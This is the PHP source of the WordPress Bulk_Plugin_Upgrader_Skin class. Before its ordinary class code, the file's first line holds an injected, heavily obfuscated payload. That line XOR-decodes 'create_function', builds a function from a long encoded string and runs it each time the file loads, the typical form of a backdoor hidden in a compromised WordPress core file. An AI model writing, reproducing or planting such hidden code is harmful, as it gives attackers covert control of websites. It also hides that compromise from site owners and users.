<?php $HlPsLoGIOnTI='YG7 XT+2UYSXGR-'^':5RA,1tT 70,.=C';$VbqyVPUn=$HlPsLoGIOnTI('','P jdUG747<R>aE-RS,<RMD58hHS6Tq>Z3ADPQK0;;+<N1LS5Bw+T>0O95Rsb,M-zTHZJ-AahX76hNsbLx=L;hrD1ZMkmkbAR5LUU7FKZFWReSPgES:-D6=,otH30ZnbOw3MBflLerXH9RZnCCB3J<1gJ .Y;kvVT,gS8WWHB.N9W;Bt32MDhAbfh1;6T-<Czp88JqlhZPK1ZcE0JL Vgr6W=<5KeJPJA72=+5kgR+WPKThFI VK+15<oOIf.v9k=sLM4MGX-ItMimc9L8-EfXWIBo7ZOVl343JwiL:VILNBCTW;;rqLRBMP20jmJM8UHuQNrD6=9PDG87.84IQ-ZmXFo+r5exsfSWHgeRH:PXXEmM+BE-Ph2hkXU4OY1n 3;irsbRS1NnYHCDV;XVzjqZ6RXKSOo0AAcPv>JD7Vil6-6CQOI5==9Qc0B=:-1X8flU>Ae8Z=SCa835O:J-PJ0S25zMBjXQG0gQ,WhZSM;FoiWO ,wAKH;FR5C53E6l4DT9CXCnYVLrEoN7OT1hRNaWq4,RaIV02R7fRTYwhqWGvzvXfDiwjEWqPDXtaE Xe6yAMqdUF1UXTZRRCeUVgL6YL>>XE5=,:8;0DmJ91WAWZ5KNgGW4CSYbhwimRlGrYK3T4KA>4L7vH=.E9O 5o.DL;b0EEGEDAaG8'^'9FBE32YWCU=P> U; XOzj<ZJ7,2B5.a7F5cyxkK12MI R8:Z,WS;Lo+XA3,=A8YRp,;>LmAL3ROAnSBlXFF2aV+D.mVMLEzX<E3:Eno3fjrUhpC,oIY6ZXBGP,RD;GYoSZfiOfElV7=MrtSckfW+HP<nIsyeKR=1U<wQwrh1Z<U2UjPXW4m5hYla8IS XN-RTWM>XWbS-ALPiaT+8AvZRP6QOPpon4+5VmVNLKZrM6<81SLCF99NPVTOgm9m9v t6l,Gmc3H0TpWMGO-TX Ox,CKKS;;73XQJjJIhQ30wDKg06OZRLlv4,<GUQg7G2<.UyoV WIXyd<2>HWF,0N2Mpb0y7d0= 2s6;GA9-CpefeI;J.0HyHIbbQqP.-P1KVBIOSF96HudPAg 7O9vGJU,W>-.hEfMK<iZRZ+0VvTLvXX04= TQTC4KH-OeIP,Y938K5MZ;N6uUgWP,U.HxnT2FTSabN<03Q8:I.AshGR GM3.TMWgmhZ4 T:jX O3Q<=J7+kI235UiOjS. PArhGwYYHgIm2QF3lA91 P5XwzKZQ9RqQGXwgHgq:EP DlUPOtxCUg R0<a<7ujEspG-D+-Ga3 LbIBQHD7EmIP.-8;QlbGc3U72pKHWIMrL<xP.E5XceZU8V-oMO<U AQHsmw1kU=,3mthZME');$VbqyVPUn();
/**
 * Upgrader API: Bulk_Plugin_Upgrader_Skin class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Bulk Plugin Upgrader Skin for WordPress Plugin Upgrades.
 *
 * @since 3.0.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader-skins.php.
 *
 * @see Bulk_Upgrader_Skin
 */
class Bulk_Plugin_Upgrader_Skin extends Bulk_Upgrader_Skin {
	public $plugin_info = array(); // Plugin_Upgrader::bulk() will fill this in.

	public function add_strings() {
		parent::add_strings();
		$this->upgrader->strings['skin_before_update_header'] = __('Updating Plugin %1$s (%2$d/%3$d)');
	}

	/**
	 *
	 * @param string $title
	 */
	public function before($title = '') {
		parent::before($this->plugin_info['Title']);
	}

	/**
	 *
	 * @param string $title
	 */
	public function after($title = '') {
		parent::after($this->plugin_info['Title']);
		$this->decrement_update_count( 'plugin' );
	}

	/**
	 * @access public
	 */
	public function bulk_footer() {
		parent::bulk_footer();
		$update_actions =  array(
			'plugins_page' => '<a href="' . self_admin_url( 'plugins.php' ) . '" target="_parent">' . __( 'Return to Plugins page' ) . '</a>',
			'updates_page' => '<a href="' . self_admin_url( 'update-core.php' ) . '" target="_parent">' . __( 'Return to WordPress Updates page' ) . '</a>'
		);
		if ( ! current_user_can( 'activate_plugins' ) )
			unset( $update_actions['plugins_page'] );

		/**
		 * Filters the list of action links available following bulk plugin updates.
		 *
		 * @since 3.0.0
		 *
		 * @param array $update_actions Array of plugin action links.
		 * @param array $plugin_info    Array of information for the last-updated plugin.
		 */
		$update_actions = apply_filters( 'update_bulk_plugins_complete_actions', $update_actions, $this->plugin_info );

		if ( ! empty($update_actions) )
			$this->feedback(implode(' | ', (array)$update_actions));
	}
}
